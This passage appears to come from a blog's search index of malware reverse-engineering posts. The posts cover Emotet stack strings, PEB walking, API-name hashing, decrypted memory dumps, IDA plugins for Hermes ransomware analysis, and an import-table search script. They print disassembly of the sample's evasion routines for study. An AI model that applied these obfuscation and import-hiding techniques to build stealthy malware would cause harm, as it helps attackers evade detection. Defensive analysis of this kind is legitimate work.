have been doing research in this area, finding samples to reverse engineer, and of course, watching plenty of people do their own reversing work to learn from. In one series of videos on reverse engineering a Hermes ransomware sample there were a set of Ghidra scripts used to perform a number of tasks during analysis.There were two scripts in particular that I decided to convert to IDA Pro 7.6 (my only contribution to the below work that was created by AGDC services).AttributionAGDC Services video series on reversing Hermes ransomware Hermes Malware Deep Dive Pt 1 - Unpacking Hermes Malware Deep Dive Pt 2Ghidra scripts used in the video series Ghidra-Scripts Misc-Malware-Analysis-ToolsMy IDA Pro 7.6 plugin scripts (rough conversion of theirs)https://github.com/tdmathison/HelperScripts/tree/master/AGDCservicesNOTE: This covers the highlighting and the script to resolve IAT entries within IDA Pro (7.4+ compatible)DetailsWhen dropping all three of the IDA Pro plugin files to the &amp;lt;IDA PRO Install Dir&amp;gt;\\plugins\\ directory you will see them show up in the Edit-&amp;gt;Plugins menu as seen below:Color coding instructionsTo make it easier to visually focus in on certain types of calls in assembly I was using a plugin called fluorescence that allows you to toggle on/off highlighting of call instructions. This has been very helpful, however, I think I am now going to make use of the AGDCservices version that enhances this a bit more by identifying calls, pointers, likely crypto operations, and string operations.My converted plugins for this are here: AGDCservices_highlight_target_instructions_plugin.py AGDCservices_clear_all_instruction_colors_plugin.pyWhen the plugin is invoked you will see the assembly in IDA Pro light up as seen below (and you can remove the highlighting by calling the other plugin):IAT ResolutionSince malware often resolves imports dynamically at runtime you will not see a properly populated import table during initial static analysis. The idea here is to locate where the malware resolves the imports and builds an import table. When you have located this, you can debug into the malware and right after the resolution has occurred you can take a snapshots of the RVA’s of the imports. This is the relative offsets from the image base to which they are located.To perform this action AGDCservices uses the following executable:Dump_Labeled_Iat_Memory.exeThe IDA Pro plugin to use this outputOnce you have this file with the imports and associated RVA’s you can use the following plugin to apply it to the IDA database:AGDCservices_label_iat_entries_plugin.pyBefore:After:ConclusionThere are many ways to achieve these types of results and everybody ends up developing their own tools and workflows. This is just another one that seems to work well for this task that I will be taking parts of it away with me to integrate into my own workflow. Be sure to watch the videos of the source of this that I pointed out in the attribution section to get the full walkthrough." }, { "title": "String and function hiding techniques", "url": "/posts/String-and-function-hiding-techniques/", "categories": "Blogging, Malware-Analysis", "tags": "malware, emotet, debugging, ida, ghidra, memory, techniques, stack, obfuscation, ntdll.dll, kernel32.dll", "date": "2021-04-12 12:10:00 -0700", "snippet": "Table of Contents Intro The malware sample used in this blog post Visual of observed flows Notable Techniques Hiding strings via single byte pushes to stack Getting DllBase and export table Thread Environment Block (TEB) Process Environment Block (PEB) PEB Loader Data PEB Loader Data Entry Encoded string obfuscation IntroThis is carrying on from the previous post on finding the start of the malicious user code in the MFC application. While continuing to step through there are several notable techniques that are worth mentioning as they are common for a lot of malware.Due to the size of this sample I won’t be continuing to analyze every assembly instruction and will use a more dynamic approach to attempt to locate the key areas big actions take place like copying itself to a new location and deleting it’s original file as well as performing a series of posts to a large collection of C&amp;amp;C IPs.This post will discuss three techniques seen early on: Hiding strings via single byte pushes to stack Getting DllBase and export table to crawl export functions of ntdll.dll and kernel32.dll Encoded string obfuscationThe malware sample used in this blog post MD5 hash: a4513379dad5233afa402cc56a8b9222 VirusTotal link to sample: https://www.virustotal.com/gui/file/ccd380ea868ffad4f960d7455fecf88c2ac3550001bbb6c21c31ae70b3bbf4f6/detectionVisual of observed flowsAn overall digram of the beginning flow that contains the techniques to be discussed.Numbers techniques are tied to in the diagram:Notable TechniquesHiding strings via single byte pushes to stackObserve the following sequence of assembly. A repeating pattern of moving a single hex byte to EAX and pushing it to the stack is performed. NOTE: often it will be full DWORD’s that are pushed to put together a final string.00500022 B8 6B000000 MOV EAX,6B00500027 66:8945 98 MOV WORD PTR SS:[EBP-68],AX0050002B B9 65000000 MOV ECX,6500500030 66:894D 9A MOV WORD PTR SS:[EBP-66],CX00500034 BA 72000000 MOV EDX,7200500039 66:8955 9C MOV WORD PTR SS:[EBP-64],DX0050003D B8 6E000000 MOV EAX,6E00500042 66:8945 9E MOV WORD PTR SS:[EBP-62],AX00500046 B9 65000000 MOV ECX,650050004B 66:894D A0 MOV WORD PTR SS:[EBP-60],CX0050004F BA 6C000000 MOV EDX,6C00500054 66:8955 A2 MOV WORD PTR SS:[EBP-5E],DX00500058 B8 33000000 MOV EAX,330050005D 66:8945 A4 MOV WORD PTR SS:[EBP-5C],AX00500061 B9 32000000 MOV ECX,3200500066 66:894D A6 MOV WORD PTR SS:[EBP-5A],CX0050006A BA 2E000000 MOV EDX,2E0050006F 66:8955 A8 MOV WORD PTR SS:[EBP-58],DX00500073 B8 64000000 MOV EAX,6400500078 66:8945 AA MOV WORD PTR SS:[EBP-56],AX0050007C B9 6C000000 MOV ECX,6C00500081 66:894D AC MOV WORD PTR SS:[EBP-54],CX00500085 BA 6C000000 MOV EDX,6C0050008A 66:8955 AE MOV WORD PTR SS:[EBP-52],DX0050008E 33C0 XOR EAX,EAX00500090 66:8945 B0 MOV WORD PTR SS:[EBP-50],AX00500094 B9 6E000000 MOV ECX,6E00500099 66:894D B4 MOV WORD PTR SS:[EBP-4C],CX0050009D BA 74000000 MOV EDX,74005000A2 66:8955 B6 MOV WORD PTR SS:[EBP-4A],DX005000A6 B8 64000000 MOV EAX,64005000AB 66:8945 B8 MOV WORD PTR SS:[EBP-48],AX005000AF B9 6C000000 MOV ECX,6C005000B4 66:894D BA MOV WORD PTR SS:[EBP-46],CX005000B8 BA 6C000000 MOV EDX,6C005000BD 66:8955 BC MOV WORD PTR SS:[EBP-44],DX005000C1 B8 2E000000 MOV EAX,2E005000C6 66:8945 BE MOV WORD PTR SS:[EBP-42],AX005000CA B9 64000000 MOV ECX,64005000CF 66:894D C0 MOV WORD PTR SS:[EBP-40],CX005000D3 BA 6C000000 MOV EDX,6C005000D8 66:8955 C2 MOV WORD PTR SS:[EBP-3E],DX005000DC B8 6C000000 MOV EAX,6C005000E1 66:8945 C4 MOV WORD PTR SS:[EBP-3C],AX005000E5 33C9 XOR ECX,ECX005000E7 66:894D C6 MOV WORD PTR SS:[EBP-3A],CX005000EB 8D55 B4 LEA EDX,DWORD PTR SS:[EBP-4C]005000EE 52 PUSH EDXAll these bytes pushed to the stack result in the string seen below (also note, when pushing to the stack it is being done in reverse order). The malware could have just had the full string saved in the .data section and loaded it, however, it would then come up in static analysis when searching for strings.Many variations of this technique are used to hide DLL names or names of exported functions it will later fetch via GetProcAddress so they don’t show up in the export table during static analysis.0019F3EC 6B 00 65 00 72 00 6E 00 65 00 6C 00 k.e.r.n.e.l.0019F3FC 33 00 32 00 2E 00 64 00 6C 00 6C 00 00 00 19 00 3.2...d.l.l....0019F40C 6E 00 74 00 64 00 6C 00 6C 00 2E 00 64 00 6C 00 n.t.d.l.l...d.l.0019F41C 6C 00 l.Getting DllBase and export tableAnother sequence of calls that must be known has to do with getting the Process Environment Block (PEB), the LoaderData, the ModuleList, and the export table. Let’s take a look at two important structures and their offsets.The Thread Environment Block (TEB) can be accessed via calls that look like DWORD PTR FS:[30]. In fact his is the most common one as its gets a reference to the PEB structure which is where the rest of the crawling around the structures typically start from.The following structures and offsets are referenced in the following examples.Thread Environment Block (TEB)struct TEB { DWORD EnvironmentPointer; //+1C DWORD ProcessId; //+20 DWORD threadId; //+24 DWORD ActiveRpcInfo; //+28 DWORD ThreadLocalStoragePointer; //+2C PEB* Peb; //+30 ...and more...Process Environment Block (PEB)struct PEB { char InheritedAddressSpace; //+00 char ReadImageFileExecOptions; //+01 char BeingDebugged; //+02 char Spare; //+03 DWORD Mutant; //+04 DWORD ImageBaseAddress; //+08 _PEB_LDR_DATA* LoaderData; //+0C ...and more...PEB Loader Datastruct _PEB_LDR_DATA { DWORD Length_; //+00 DWORD Initialized; //+04 DWORD SsHandle; //+08 __LIST_ENTRY InLoadOrderModuleList; //+0C __LIST_ENTRY InMemoryOrderModuleList; //+14 __LIST_ENTRY InInitializationOrderModuleList; //+1C DWORD EntryInProgress; //+24 DWORD ShutdownInProgress; //+28 DWORD ShutdownThreadId; //+2C};PEB Loader Data Entrystruct _LDR_DATA_TABLE_ENTRY{ __LIST_ENTRY InLoadOrderLinks; //+00 __LIST_ENTRY InMemoryOrderLinks; //+08 __LIST_ENTRY InInitializationOrderLinks; //+10 DWORD DllBase; //+18 DWORD EntryPoint; //+1C DWORD SizeOfImage; //+20 DWORD FullDllNameLength; //+24 char* FullDllName; // _UNICODE_STRING //+28 DWORD BaseDllNameLength; //+2C char* BaseDllName; //_UNICODE_STRING //+30 DWORD Flags; //+34 short LoadCount; //+38 short TlsIndex; //+3C ...and more...};In our sample, we have the following function. It attempts to get the base address of ntdll.dll through the following sequence of structure crawling:The below assembly can be summed up as “find ntdll.dll and return the base address of it”.00500260 55 PUSH EBP00500261 8BEC MOV EBP,ESP00500263 83EC 10 SUB ESP,1000500266 64:A1 30000000 MOV EAX,DWORD PTR FS:[30] ; PEB0050026C 8945 F4 MOV DWORD PTR SS:[EBP-C],EAX0050026F 8B4D F4 MOV ECX,DWORD PTR SS:[EBP-C]00500272 8B51 0C MOV EDX,DWORD PTR DS:[ECX+C] ; _PEB_LDR_DATA* LoaderData00500275 8955 F8 MOV DWORD PTR SS:[EBP-8],EDX00500278 8B45 F8 MOV EAX,DWORD PTR SS:[EBP-8]0050027B 8B48 0C MOV ECX,DWORD PTR DS:[EAX+C] ; __LIST_ENTRY InLoadOrderModuleList0050027E 894D F0 MOV DWORD PTR SS:[EBP-10],ECX00500281 8B55 F8 MOV EDX,DWORD PTR SS:[EBP-8]00500284 8B42 0C MOV EAX,DWORD PTR DS:[EDX+C]00500287 8945 FC MOV DWORD PTR SS:[EBP-4],EAX0050028A 8B4D 08 MOV ECX,DWORD PTR SS:[EBP+8]0050028D 51 PUSH ECX0050028E 8B55 FC MOV EDX,DWORD PTR SS:[EBP-4]00500291 8B42 30 MOV EAX,DWORD PTR DS:[EDX+30] ; name of running binary00500294 50 PUSH EAX00500295 E8 66000000 CALL 00500300 ; compare_strings0050029A 83C4 08 ADD ESP,80050029D 85C0 TEST EAX,EAX0050029F 75 08 JNZ SHORT 005002A9 ; do not match005002A1 8B4D FC MOV ECX,DWORD PTR SS:[EBP-4] ; ECX = _LDR_DATA_TABLE_ENTRY005002A4 8B41 18 MOV EAX,DWORD PTR DS:[ECX+18] ; EAX = DWORD DllBase005002A7 EB 12 JMP SHORT 005002BB ; found match -&amp;gt; exit loop005002A9 8B55 FC MOV EDX,DWORD PTR SS:[EBP-4]005002AC 8B02 MOV EAX,DWORD PTR DS:[EDX]005002AE 8945 FC MOV DWORD PTR SS:[EBP-4],EAX005002B1 8B4D FC MOV ECX,DWORD PTR SS:[EBP-4]005002B4 3B4D F0 CMP ECX,DWORD PTR SS:[EBP-10]005002B7 ^ 75 D1 JNZ SHORT 0050028A005002B9 33C0 XOR EAX,EAX005002BB 8BE5 MOV ESP,EBP005002BD 5D POP EBP005002BE C3 RETNNow that we have the DllBase of ntdll.dll we can go a step further and get to the EXPORT table to enumerate it’s exported functions (this same process can be done for any DLL, not just for ntdll.dll).The following structure is the target of the next action this malware performs which is to get the exported names, addresses, and ordinals.struct image_export_directory{ unsigned long characteristics; //+00 unsigned long timestamp; //+04 unsigned short major_version; //+08 unsigned short minor_version; //+0A unsigned long name; //+0C unsigned long base; //+10 unsigned long number_of_functions; //+14 unsigned long number_of_names; //+18 unsigned long address_of_functions; //+1C // RVA from base of image unsigned long address_of_names; //+20 // RVA from base of image unsigned long address_of_name_ordinals; //+24 // RVA from base of image};The below function has access to the BaseDll address which is stored in EBP+8.00500540 55 PUSH EBP00500541 8BEC MOV EBP,ESP00500543 83EC 20 SUB ESP,2000500546 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8] ; EAX = ntdll.dll-&amp;gt;BaseDll00500549 8945 F4 MOV DWORD PTR SS:[EBP-C],EAX0050054C 8B4D F4 MOV ECX,DWORD PTR SS:[EBP-C]0050054F 8B55 08 MOV EDX,DWORD PTR SS:[EBP+8]00500552 0351 3C ADD EDX,DWORD PTR DS:[ECX+3C] ; PE offset (skip DOS header)00500555 8955 F0 MOV DWORD PTR SS:[EBP-10],EDX00500560 8B55 F0 MOV EDX,DWORD PTR SS:[EBP-10] ; PE offset00500563 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8] ; ntdll.dll-&amp;gt;BaseDll00500566 03440A 78 ADD EAX,DWORD PTR DS:[EDX+ECX+78] ; EXPORT table data entry0050056A 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX0050056D 8B4D F8 MOV ECX,DWORD PTR SS:[EBP-8]00500570 8B55 08 MOV EDX,DWORD PTR SS:[EBP+8]; RVA of Name Pointer Table - addresses of exported function names00500573 0351 20 ADD EDX,DWORD PTR DS:[ECX+20] 00500576 8955 EC MOV DWORD PTR SS:[EBP-14],EDX00500579 8B45 F8 MOV EAX,DWORD PTR SS:[EBP-8]0050057C 8B4D 08 MOV ECX,DWORD PTR SS:[EBP+8]; RVA of Address Table - addresses of exported functions0050057F 0348 1C ADD ECX,DWORD PTR DS:[EAX+1C]00500582 894D E0 MOV DWORD PTR SS:[EBP-20],ECX00500585 8B55 F8 MOV EDX,DWORD PTR SS:[EBP-8]00500588 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]; RVA of Ordinal Table - function order number as listed in the table0050058B 0342 24 ADD EAX,DWORD PTR DS:[EDX+24]When studying the PE-Format we can see that Win32 binaries have a DOS Stub that is placed at the front of the EXE image. The format states that: “At location 0x3c, the stub has the file offset to the PE signature. This information enables Windows to properly execute the image file, even though it has an MS-DOS stub. This file offset is placed at location 0x3c during linking.”With this known, we can view a table of offsets relative to DllBase+3C to make sense of which structures or addresses the malware is after in the above sample. Structure / Address Offset RVA of Export Table 0x78 address_of_functions 0x78+0x1C address_of_names 0x78+0x20 address_of_name_ordinals 0x78+0x24 Now, with EBP-14 containing the addresses of exported function names we see it iterate over it via a counter in ECX and index to each subsequent item which are all 4 bytes long.; ECX = counter005005AE 8B4D FC MOV ECX,DWORD PTR SS:[EBP-4]...; index into next exported function name005005B7 03048A ADD EAX,DWORD PTR DS:[EDX+ECX*4]In this sample we are analyzing it is looping through searching for specific exported function names that are encoded in some way. As it will turn out, the method in which is encodes them doesn’t really matter but it does show another example of how the names would not turn up during the initial static analysis.Encoded string obfuscationThis sample decrypted a resource file found as RCData = 666 (0x29A). You can see this if you view the original binary in Resource Hacker. It is mapped to 00560000 and called into via the following instruction:00560024 E8 04000000 CALL 0056002DIn the following instructions we see a case where the name of the exported function was encoded in some way and stored. Upon looping through the exported function names via the previous technique it will use the same encoding function to generate a comparable string to perform a match on.You can think of this similar to how passwords are hashed and the hash is stored. Upon typing a password in it re-hashes it in the same way and then compares them. This is essentially what we see here and the exact method of encoding becomes less important once it was understood exactly what the 00560467 function was doing.0056002D 83EC 48 SUB ESP,4800560030 836424 18 00 AND DWORD PTR SS:[ESP+18],000560035 B9 4C772607 MOV ECX,726774C0056003A 53 PUSH EBX0056003B 55 PUSH EBP0056003C 56 PUSH ESI0056003D 57 PUSH EDI0056003E 33F6 XOR ESI,ESI00560040 E8 22040000 CALL 00560467 ; 726774C = KERNEL32.LoadLibraryA00560045 B9 49F70278 MOV ECX,7802F7490056004A 894424 1C MOV DWORD PTR SS:[ESP+1C],EAX0056004E E8 14040000 CALL 00560467 ; 7802F749 = KERNEL32.GetProcAddress00560053 B9 58A453E5 MOV ECX,E553A45800560058 894424 20 MOV DWORD PTR SS:[ESP+20],EAX0056005C E8 06040000 CALL 00560467 ; E553A458 = KERNEL32.VirtualAlloc00560061 B9 10E18AC3 MOV ECX,C38AE11000560066 8BE8 MOV EBP,EAX00560068 E8 FA030000 CALL 00560467 ; C38AE110 = KERNEL32.VirtualProtect0056006D B9 AFB15C94 MOV ECX,945CB1AF00560072 894424 2C MOV DWORD PTR SS:[ESP+2C],EAX00560076 E8 EC030000 CALL 00560467 ; 945CB1AF = ntdll.ZwFlushInstructionCache0056007B B9 33009E95 MOV ECX,959E003300560080 894424 30 MOV DWORD PTR SS:[ESP+30],EAX00560084 E8 DE030000 CALL 00560467 ; 959E0033 = KERNELBA.GetNativeSystemInfo00560089 8BD8 MOV EBX,EAX0056008B 8B4424 5C MOV EAX,DWORD PTR SS:[ESP+5C]0056008F 8B78 3C MOV EDI,DWORD PTR DS:[EAX+3C]00560092 03F8 ADD EDI,EAX00560094 897C24 10 MOV DWORD PTR SS:[ESP+10],EDI00560098 813F 50450000 CMP DWORD PTR DS:[EDI],4550In the above sample it has pre-encoded strings shown as 726774C, 7802F749, E553A458, C38AE110, 945CB1AF, and 959E0033. Once the matching function name (when encoded) matches this it will return the base address to it and store it in the stack for later use.It utlimately resolves the following Win32 functions that it will use:KERNEL32.LoadLibraryAKERNEL32.GetProcAddressKERNEL32.VirtualAllocKERNEL32.VirtualProtectntdll.ZwFlushInstructionCacheKERNELBA.GetNativeSystemInfoThese are important and very telling functions that you would want to break and understand what they are loading and or allocating. When you open CFF Explorer on the original file you will not see any of these listed in the Import Address Table (IAT)." }, { "title": "Malware decrypting into new memory maps", "url": "/posts/Malware-decrypting-into-new-memory-maps/", "categories": "Blogging, Malware-Analysis", "tags": "malware, emotet, debugging, ida, memory, techniques", "date": "2021-04-11 14:29:00 -0700", "snippet": "Table of Contents Intro The malware sample used in this blog post Dealing with decoded bytes into new memory map Memory allocation and passing control Viewing new bytes in IDA Dump the memory map to file Open the new file in IDA Rebase the program IntroThis is carrying on from a previous post on finding the start of the malicious user code in the MFC application. This post was to quickly cover the issue of how to continue to review code in IDA as it gets decoded into new memory maps.Due to the size of this sample I won’t be continuing to analyze every assembly instruction and will use a more dynamic approach to attempt to locate the key areas big actions take place like copying itself to a new location and deleting it’s original file as well as performing a series of posts to a large collection of C&amp;amp;C IPs.The malware sample used in this blog post MD5 hash: a4513379dad5233afa402cc56a8b9222 VirusTotal link to sample: https://www.virustotal.com/gui/file/ccd380ea868ffad4f960d7455fecf88c2ac3550001bbb6c21c31ae70b3bbf4f6/detectionDealing with decoded bytes into new memory mapMemory allocation and passing controlVirtualAlloc will be called all over to allocate new memory in order to decode or decrypt bytes to a new location. Sometimes the encoded bytes are just sitting in data segments or program code and sometimes it will pull it from a resource (this binary does both).We start back up where we left off in the previous post from a call coming out of the DialogFunc. We can see below a call to VirtualAlloc which creates a new section EAX shows that the memory address allocated was at 00500000When we observe this memory map we see it is emptyHowever, in the function that performs decryption using the key were observed earlier it will run through a decryption routine and copy the bytes decoded into the new memory section before calling into that section to continue execution.Viewing new bytes in IDAThe original binary loaded into IDA will only have the encoded bytes and not the decoded bytes to work with and view. While you can now F7 into the new code with the debugger you won’t be able to match this up in IDA yet.To accomplish this you can: Dump the memory map to file Open the new file in IDA Rebase the program to show the same memory addresses as in the debuggerDump the memory map to fileIn Immunity Debugger (OllyDbg) press ALT+M to view the memory maps and locate 00500000. From here you can right click and select Backup-&amp;gt;Save data to file.Open the new file in IDAOnce you open this new file in IDA you will see that this is seen as a binary file but not a normal executable one (no PE headers, no exports/inports, etc). You will, however, see all the new functions in their decoded form.Rebase the programWhen you are pulling in code from parts of memory like this it will not nessessarily know what address the program is based and if it were to guess it would probably use 00400000 by default. In this case it came from 00500000, however. The rebasing can be performed via the Edit-&amp;gt;Segments-&amp;gt;Rebase program option.Note, this has no other impact than helping you visualize the full address in IDA as you see it in the debugger.Upon applying this change your code will reflect the same addresses you see in the debugger as shown below" }, { "title": "Finding the start of Emotet malware in MFC app", "url": "/posts/Finding-the-start-of-Emotet-malware-in-MFC-app/", "categories": "Blogging, Malware-Analysis", "tags": "malware, emotet, mfc, afxwinmain, debugging, ida, ghidra", "date": "2021-04-07 13:29:00 -0700", "snippet": "IntroSometimes you need to dig a little to really find where the start of malicious code is in a binary. Sometimes it is not obvious from static analysis how exactly code flows to the malicious part. This post shows one case for Emotet found in an old MFC application and where exactly it gets called during the MFC initialization process.The malware sample used in this blog post MD5 hash: a4513379dad5233afa402cc56a8b9222 VirusTotal link to sample: https://www.virustotal.com/gui/file/ccd380ea868ffad4f960d7455fecf88c2ac3550001bbb6c21c31ae70b3bbf4f6/detectionA note on dynamic analysisWhen I start to analyze malware, I first use binary inspection tools and other static analysis tools to understand what is in the binary to the best of my ability. This can give a lot of details and in some cases be the only thing needed. At a minimum, it will give insight into what to look for when starting to debug into it live.During the debugging process I take a snapshot in VMware once I have the binary open in IDA Pro and also have it open in Immunity Debugger and breaked on the Entry point of the binary. When something goes wrong and the malware breaks free you can just revert to this snapshot and start over (this happened many times as I was figuring out the final user code function called by the MFC application).Lastly, it is very helpful to not just stay in Immunity Debugger but to swap back and forth between IDA Pro (or Ghidra) and the debugger as you move through it. For me, at least, it is easier to understand and visualize the potential branches and jumps in IDA to prepare for it in the debugger.Debugging workflowA visual of functions and calls we step throughThrough IDA and Immunity Debugger’s eyesBreak at entry:.text:00404878 push 60hScrolling down you eventually see AfxWinMain (WinMain is wrapped by AfxWinMain by the MFC framework).text:004049f7 e8 02 98 CALL AfxWinMainThe function has some calls that are to pointers defined at runtime:.text:00413E71 call dword ptr [eax+50h].text:00413E82 call dword ptr [eax+60h].text:00413E89 call dword ptr [eax+68h]In ImmDbg I stepped through to see which call it hit:00413E71 . FF50 50 CALL DWORD PTR DS:[EAX+50] ; ccd380ea.00402410Which points to the following function:.text:00402410 sub_402410 proc near ; DATA XREF: .rdata:00419680↓o.text:00402410.text:00402410 var_1D4 = byte ptr -1D4h.text:00402410 var_C = dword ptr -0Ch.text:00402410 var_4 = dword ptr -4.text:00402410.text:00402410 push 0FFFFFFFFh.text:00402412 push offset SEH_402410.text:00402417 mov eax, large fs:0.text:0040241D push eax.text:0040241E mov large fs:0, esp.text:00402425 sub esp, 1C8h.text:0040242B push esi.text:0040242C mov esi, ecx.text:0040242E push 0.text:00402430 lea ecx, [esp+1DCh+var_1D4].text:00402434 call sub_402610.text:00402439 lea eax, [esp+1D8h+var_1D4].text:0040243D lea ecx, [esp+1D8h+var_1D4].text:00402441 mov [esp+1D8h+var_4], 0.text:0040244C mov [esi+1Ch], eax.text:0040244F call DoModel ; CDialog::DoModel().text:00402454 lea ecx, [esp+1D8h+var_1D4].text:00402458 mov [esp+1D8h+var_4], 0FFFFFFFFh.text:00402463 call sub_402390.text:00402468 mov ecx, [esp+1D8h+var_C].text:0040246F xor eax, eax.text:00402471 pop esi.text:00402472 mov large fs:0, ecx.text:00402479 add esp, 1D4h.text:0040247F retn.text:0040247F sub_402410 endpIf you execute the DoModel call, the malware will run away so we need to step into this.text:0040244f e8 f0 0e CALL CDialog::DoModal ; int DoModal(CDialog * this)Stepping in you will run across many more CALL’s:.text:00413365 e8 42 3a CALL AfxGetModuleState.text:00413373 e8 34 3a CALL AfxGetModuleState.text:00413381 ff 15 20 CALL dword ptr [-&amp;gt;KERNEL32.DLL::FindResourceA].text:00413389 ff 15 24 CALL dword ptr [-&amp;gt;KERNEL32.DLL::LoadResource].text:0041339b ff 15 28 CALL dword ptr [-&amp;gt;KERNEL32.DLL::LockResource].text:004133b1 e8 ce fa CALL CDialog::PreModal.text:004133b9 e8 8b c9 CALL AfxUnhookWindowCreate.text:004133c8 ff 15 84 CALL dword ptr [-&amp;gt;USER32.DLL::GetDesktopWindow].text:004133d6 ff 15 ec CALL dword ptr [-&amp;gt;USER32.DLL::IsWindowEnabled].text:004133e5 ff 15 5c CALL dword ptr [-&amp;gt;USER32.DLL::EnableWindow].text:004133f7 e8 71 db CALL AfxHookWindowCreate.text:004133ff e8 9d c8 CALL CWnd::FromHandle.text:00413409 e8 29 fd CALL CWnd::CreateDlgIndirectThe call to CreateDlgIndirect once again causes the malware to run away so we step into that and continue tracing through more calls:.text:00413156 e8 51 3c CALL AfxGetModuleState.text:00413161 e8 46 3c CALL AfxGetModuleState.text:0041317a e8 7b c7 CALL AfxEndDeferRegisterClass.text:00413184 e8 71 c7 CALL AfxEndDeferRegisterClass.text:004131e1 e8 e3 0b CALL CDialogTemplate::GetFont.text:0041327c e8 ec dc CALL AfxHookWindowCreateFinally, we get into another call that leads to the user code being called:00413290 . 68 D12B4100 PUSH ccd380ea.00412BD1 ; |pDlgProc = ccd380ea.00412BD100413295 . 50 PUSH EAX ; |hOwner00413296 . 56 PUSH ESI ; |pTemplate00413297 . FF75 10 PUSH DWORD PTR SS:[EBP+10] ; |hInst0041329A . FF15 88924100 CALL DWORD PTR DS:[&amp;lt;&amp;amp;USER32.CreateDialog&amp;gt;; \\CreateDialogIndirectParamAThe part to take note of is the pDlgProc address as this points to the user code that MFC will execute as a callback. Navigating to ccd380ea.00412BD1 you will find the DialogFunc function where we are about to isolate the true start of the malware we want to analyze. This is close to where I would take another snapshot during our debugging process..text:00412BD1 ; BOOL __stdcall DialogFunc(HWND, UINT, WPARAM, LPARAM).text:00412BD1 DialogFunc proc near ; DATA XREF: sub_413137+159↓o.text:00412BD1.text:00412BD1 arg_0 = dword ptr 4.text:00412BD1 arg_4 = dword ptr 8.text:00412BD1.text:00412BD1 cmp [esp+arg_4], 110h.text:00412BD9 jnz short loc_412C06.text:00412BDB push [esp+arg_0].text:00412BDF call sub_40FCC8.text:00412BE4 push eax.text:00412BE5 push offset off_41ACC0.text:00412BEA call sub_4139EB.text:00412BEF test eax, eax.text:00412BF1 pop ecx.text:00412BF2 pop ecx.text:00412BF3 jz short loc_412C01.text:00412BF5 mov edx, [eax].text:00412BF7 mov ecx, eax.text:00412BF9 call dword ptr [edx+144h] ; The malicious code starts with this call.text:00412BFF jmp short locret_412C08.text:00412C01 ; ---------------------------------------------------------------------------.text:00412C01.text:00412C01 loc_412C01: ; CODE XREF: DialogFunc+22↑j.text:00412C01 xor eax, eax.text:00412C03 inc eax.text:00412C04 jmp short locret_412C08.text:00412C06 ; ---------------------------------------------------------------------------.text:00412C06.text:00412C06 loc_412C06: ; CODE XREF: DialogFunc+8↑j.text:00412C06 xor eax, eax.text:00412C08.text:00412C08 locret_412C08: ; CODE XREF: DialogFunc+2E↑j.text:00412C08 ; DialogFunc+33↑j.text:00412C08 retn 10h.text:00412C08 DialogFunc endpStep into this call:.text:00412bf9 ff 92 44 CALL dword ptr [EDX + 0x144] ; ccd380ea.00402710This gets us to part where the malware starts allocating new memory and decrypting new program code of which I’ll have separate posts on:.text:00402710 sub_402710 proc near ; DATA XREF: .rdata:004198EC↓o.text:00402710.text:00402710 phProv = dword ptr -44h.text:00402710 var_40 = byte ptr -40h.text:00402710.text:00402710 sub esp, 44h.text:00402713 push ebx.text:00402714 push esi.text:00402715 push edi.text:00402716 mov ebx, ecx.text:00402718 mov ecx, 0Fh.text:0040271D mov esi, offset aF7R9rdcmukacUM ; &quot;%F}7~R9RdcMUkAc{U*Mzcn#F~U}e%#nVFwu~zio&quot;....text:00402722 lea edi, [esp+50h+var_40].text:00402726 rep movsd.text:00402728 push 40h ; flProtect.text:0040272A push 3000h ; flAllocationType.text:0040272F movsw.text:00402731 push 810h ; dwSize.text:00402736 push 0 ; lpAddress.text:00402738 movsb.text:00402739 call ds:VirtualAlloc.text:0040273F mov edi, ds:CryptAcquireContextA...and more...Lessons learned There are many places that malware can start but in the case of MFC applications where you see AfxWinMain called from the entry point, do a quick search for a function called DialogFunc This function labeled itself in IDA so came up in the search This function did NOT come up in Ghidra MSDN References Reference for the MSDN docs on the CreateDialogIndirectParamA func https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-createdialogindirectparama " }, { "title": "Searching IAT for DLLs", "url": "/posts/Searching-IAT-for-DLL/", "categories": "Blogging, Malware-Analysis", "tags": "malware, iat", "date": "2021-03-29 10:34:00 -0700", "snippet": "IntroWith a given binary it is very simple to view the Import Address Table (IAT) and see what DLLs it imports and further, what functions are used within those DLLs. In my case, I needed to do the opposite: I had a DLL that was known to be bad but needed to find if any binaries were importing that DLL. I have no logs or additional information to work from and just the a known drive of files.This scenaraio resulted in writing up a little python script that performs the following: Allows you to specify The root path to recursively search for files in The extension of the files to search for (my targets being EXE and DLL) The name of the import DLL to search for within the Import Table The script searches for relevant files and attempt to open it as a PE file It loops through the Import Address Table attempting to make a match on the DLL file name you are searching for If found it will print the full path to the binary so you can grab it for further analysisRunning the scriptThe script is targeting Win32 PE files but can be adapted for any file type you are after. The format for the script is:$ python3 ./iat_search.py usage: iat_search.py [-h] -p PATH -e EXTENSION -dll DLLiat_search.py: error: the following arguments are required: -p/--path, -e/--extension, -dllExample running of script on my Linux machine while looking for a DLL that is known to be present:$ python3 ./iat_search.py -p=/usr -e=exe -dll=user32.dllIndexing files: 32509817 eligible files | 3 detections----------------------------------&quot;/usr/lib/vmware/tools-upgraders/VMwareToolsUpgraderNT.exe&quot;:b&#39;USER32.dll&#39;&quot;/usr/lib/vmware/tools-upgraders/VMwareToolsUpgrader9x.exe&quot;:b&#39;USER32.dll&#39;&quot;/usr/lib/vmware/tools-upgraders/VMwareToolsUpgrader.exe&quot;:b&#39;USER32.dll&#39;SourceThe script can be grabbed from the following location and used/modified as needed: https://github.com/tdmathison/HelperScripts/blob/master/iat_search.py" }, { "title": "PEB/TEB/TIB Structure Offsets", "url": "/posts/PEB_TEB_TIB-Structure-Offsets/", "categories": "Blogging, Malware-Analysis", "tags": "malware, assembly", "date": "2021-02-05 11:10:00 -0800", "snippet": "IntroThis is really more of a reference table post to show the PEB/TEB/TIB structure notable offsets that are commonly seen in malware as it performs references after fetching the Process Environment Block (PEB) via FS:[0x30]. Knowing the offsets in the structures can help quickly identify them during reverse engineering your binary.Attribution: The structure offsets shown in the below tables are directly pulled from Amr Thabet’s x86Emulator project in the file tib.h.PEB TableThe Process Environment Block structure contains the process wide data structures which include global context, startup parameters, data structures for the program image loader, the program image base address, and synchronization objects. Name Offset char InheritedAddressSpace +00 char ReadImageFileExecOptions +1 DWORD Mutant +04 DWORD ImageBaseAddress +08 